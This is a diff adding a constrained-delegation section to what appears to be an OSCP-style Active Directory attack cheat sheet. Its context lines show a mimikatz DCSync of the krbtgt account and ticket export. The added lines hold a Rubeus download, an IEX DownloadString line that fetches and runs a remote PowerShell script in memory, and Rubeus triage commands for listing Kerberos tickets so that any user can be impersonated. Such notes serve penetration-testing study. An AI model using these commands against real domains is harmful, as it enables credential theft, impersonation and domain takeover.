@@ -1403,6 +1403,28 @@ lsadump::dcsync /user:tech\krbtgt
 [System.Convert]::ToBase64String([System.IO.File]::ReadAllBytes("C:\ticket.kirbi")); 
 ```
 
+## CONSTRAINED DELEGATION - RUBEUS
+If you have an account or computer with the constrained delegation privilege, it is possible to impersonate any other user and authenticate yourself to a service where the user is allowed to delegate.
+##### CONSTRAINED DELEGATION RUBEUS - LOAD REQUIREMENTS
+```
+curl https://github.com/n0ts0cial/oscp/raw/main/rubeus/Rubeus.exe -Outfile rubeus.exe
+```
+```
+IEX(New-Object System.Net.WebClient).DownloadString("https://github.com/n0ts0cial/oscp/raw/main/Invoke-Rubeus.ps1")
+```
+
+##### CONSTRAINED DELEGATION RUBEUS - LIST TICKETS
+```
+.\Rubeus.exe triage
+.\Rubeus.exe triage /user:administrator
+.\Rubeus.exe triage /luid:0xd62d4
+```
+```
+Invoke-Rubeus triage
+Invoke-Rubeus 'triage'
+```
+
+
 
 
 
